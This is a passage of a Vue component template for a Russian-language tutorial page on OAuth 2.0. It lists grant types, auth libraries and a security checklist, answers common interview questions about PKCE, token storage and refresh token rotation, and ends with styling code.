                <td><b>Client Credentials</b></td>
                <td>Server-to-server</td>
                <td class="text-success">⭐⭐⭐⭐</td>
                <td class="text-success">Да</td>
                <td class="text-success">✅ Для сервисов</td>
              </tr>
              <tr>
                <td><b>Password</b></td>
                <td>Legacy / first-party only</td>
                <td class="text-warning">⭐⭐</td>
                <td class="text-success">Да</td>
                <td class="text-warning">⚠️ Не рекомендуется</td>
              </tr>
              </tbody>
            </v-table>

            <h2 class="text-h5 font-weight-bold mb-3">Типы токенов</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedTokenTypes"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Инструменты и библиотеки для реализации</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedImplementation"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Популярные библиотеки и сервисы</h2>
            <v-row class="mb-8">
              <v-col cols="12" md="6">
                <v-card class="pa-4 h-100">
                  <h3 class="text-h6 font-weight-bold mb-2">Managed сервисы (Рекомендуется)</h3>
                  <ul class="pl-4">
                    <li><strong>Auth0</strong> — enterprise, много фич</li>
                    <li><strong>Supabase Auth</strong> — open source, простой</li>
                    <li><strong>Firebase Auth</strong> — Google ecosystem</li>
                    <li><strong>Clerk</strong> — современный UX</li>
                    <li><strong>AWS Cognito</strong> — AWS интеграция</li>
                  </ul>
                </v-card>
              </v-col>
              <v-col cols="12" md="6">
                <v-card class="pa-4 h-100">
                  <h3 class="text-h6 font-weight-bold mb-2">Self-hosted библиотеки</h3>
                  <ul class="pl-4">
                    <li><strong>NextAuth.js</strong> — для Next.js</li>
                    <li><strong>Passport.js</strong> — Node.js</li>
                    <li><strong>SimpleLogin</strong> — Python/Flask</li>
                    <li><strong>Keycloak</strong> — Java, enterprise</li>
                    <li><strong>ORY</strong> — Go, cloud-native</li>
                  </ul>
                </v-card>
              </v-col>
            </v-row>

            <h2 class="text-h5 font-weight-bold mb-3">Безопасность OAuth</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedSecurity"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Чек-лист безопасности</h2>
            <v-row class="mb-8">
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="success" class="mb-2">mdi-check-circle</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">✅ Обязательно</h3>
                  <ul class="text-left pl-4">
                    <li>Используйте HTTPS везде</li>
                    <li>Валидируйте redirect_uri</li>
                    <li>Используйте state для CSRF</li>
                    <li>PKCE для SPA</li>
                    <li>httpOnly cookies для токенов</li>
                    <li>Короткий lifetime для access_token</li>
                  </ul>
                </v-card>
              </v-col>
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="error" class="mb-2">mdi-close-circle</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">❌ Никогда</h3>
                  <ul class="text-left pl-4">
                    <li>localStorage для токенов</li>
                    <li>Токены в URL</li>
                    <li>Client secret в frontend</li>
                    <li>Implicit flow</li>
                    <li>Игнорирование state</li>
                    <li>Вечные токены</li>
                  </ul>
                </v-card>
              </v-col>
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="info" class="mb-2">mdi-lightbulb</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">💡 Дополнительно</h3>
                  <ul class="text-left pl-4">
                    <li>Refresh token rotation</li>
                    <li>Token introspection</li>
                    <li>Rate limiting</li>
                    <li>Anomaly detection</li>
                    <li>Audit logging</li>
                    <li>MFA опционально</li>
                  </ul>
                </v-card>
              </v-col>
            </v-row>

            <h2 class="text-h5 font-weight-bold mb-3">Влияние OAuth на пользовательский опыт</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedUX"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Частые вопросы на собеседовании</h2>
            <ol class="ol-list mb-8">
              <li class="mb-4">
                <p class="font-weight-bold mb-1">В чем разница между OAuth и OpenID Connect?</p>
                <p class="font-weight-regular ma-0">
                  OAuth 2.0 — это протокол <b>авторизации</b> (получение доступа к ресурсам).
                  OpenID Connect (OIDC) — это слой <b>аутентификации</b> поверх OAuth 2.0, который добавляет
                  ID Token с информацией о пользователе. OIDC = OAuth 2.0 + идентификация пользователя.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Почему нельзя хранить access_token в localStorage?</p>
                <p class="font-weight-regular ma-0">
                  localStorage доступен из JavaScript, что делает его уязвимым к XSS атакам. Злоумышленник
                  может внедрить скрипт и украсть токен. Используйте httpOnly cookies или memory storage.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Что такое PKCE и зачем он нужен?</p>
                <p class="font-weight-regular ma-0">
                  PKCE (Proof Key for Code Exchange) защищает от перехвата authorization code.
                  Обязателен для SPA и мобильных приложений, где нельзя безопасно хранить client_secret.
                  Работает через code_verifier и code_challenge.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Как работает refresh token rotation?</p>
                <p class="font-weight-regular ma-0">
                  При каждом использовании refresh_token сервер выдает новый refresh_token и инвалидирует старый.
                  Это позволяет обнаружить кражу токена: если украденный токен используется после настоящего,
                  оба токена инвалидируются и пользователь выходит из системы.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Какой grant type использовать для React SPA?</p>
                <p class="font-weight-regular ma-0">
                  <b>Authorization Code Flow + PKCE</b>. Это самый безопасный вариант для SPA.
                  Implicit Flow deprecated и небезопасен. PKCE заменяет необходимость в client_secret.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Как реализовать OAuth без готовых библиотек?</p>
                <p class="font-weight-regular ma-0">
                  Не рекомендуется для production. OAuth сложен, легко допустить ошибки безопасности.
                  Используйте проверенные библиотеки (Auth0, Supabase, NextAuth.js). Для обучения можно
                  реализовать базовый flow, но помните о всех нюансах безопасности.
                </p>
              </li>
            </ol>

            <h2 class="text-h5 font-weight-bold mb-3">Итог</h2>
            <p class="font-weight-regular mb-6">
              <b>OAuth 2.0</b> — это современный стандарт безопасной авторизации, который позволяет приложениям
              получать доступ к ресурсам пользователя без передачи паролей. Ключевые компоненты: Resource Owner,
              Client, Authorization Server, Resource Server. Для SPA используйте <b>Authorization Code + PKCE</b>,
              для backend — <b>Authorization Code Flow</b>. Токены храните в <b>httpOnly cookies или memory</b>,
              никогда в localStorage. Используйте готовые решения (Auth0, Supabase) для упрощения реализации
              и повышения безопасности.
            </p>

            <div class="d-flex justify-end">
              <v-btn
                color="primary"
                size="small"
                variant="elevated"
                href="https://oauth.net/2/"
                target="_blank"
                class="mr-2">
                OAuth 2.0 Spec
              </v-btn>
              <v-btn
                color="secondary"
                size="small"
                variant="elevated"
                href="https://auth0.com/docs/get-started/authentication-and-authorization-flow"
                target="_blank">
                Auth0 Guide
              </v-btn>
            </div>
          </v-col>
        </v-row>
      </v-container>
    </v-main>
  </v-app>
</template>

<style scoped>
.oauth-flow-diagram {
  display: flex;
  align-items: center;
  justify-content: space-around;
  padding: 2rem;
  flex-wrap: wrap;
  gap: 1rem;
}

.flow-step {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 0.5rem;
}

.step-label {
  text-align: center;
  font-size: 0.875rem;
  font-weight: 500;
}

@media (max-width: 768px) {
  .oauth-flow-diagram {
    flex-direction: column;
  }
}
</style>
